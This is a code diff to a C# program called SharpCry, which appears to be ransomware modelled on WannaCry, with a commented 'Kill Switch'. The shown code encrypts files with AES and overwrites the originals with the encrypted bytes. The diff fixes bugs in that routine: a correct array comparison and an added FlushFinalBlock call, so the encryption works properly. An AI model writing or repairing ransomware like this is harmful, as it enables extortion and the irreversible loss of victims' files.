@@ -1,4 +1,4 @@
-﻿using System;                           // General
+using System;                           // General
 using System.Net;                       // HTTP Client Handle   : Kill Switch
 using System.Net.Http;                  // HTTP Client Handle   : Kill Switch
 using System.IO;                        // File Handle          : Read & Write Files
@@ -121,7 +121,7 @@ namespace SharpCry
                 byte[] __DATA = File.ReadAllBytes(FILE);
                 byte[] __ENC_DATA = Encrypt(__AES_KEY, __AES_IV, __DATA);
                 byte[] __DEC_DATA = Decrypt(__AES_KEY, __AES_IV, __ENC_DATA);
-                if (__DATA == __DEC_DATA) { Console.WriteLine($"[DEBUG] [ Main ] AES checksum failed."); continue; }
+                if (!__DATA.SequenceEqual(__DEC_DATA)) { Console.WriteLine($"[DEBUG] [ Main ] AES checksum failed."); continue; }
                 if (__SAFETY == true) {
                     Console.WriteLine($"[DEBUG] [ Main ] \"{FILE}\"");
                     File.WriteAllBytes(FILE, __ENC_DATA);
@@ -151,6 +151,7 @@ namespace SharpCry
                     using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                     {
                         cs.Write(DATA, 0, DATA.Length);
+                        cs.FlushFinalBlock();
                     }
                     return ms.ToArray();
                 }
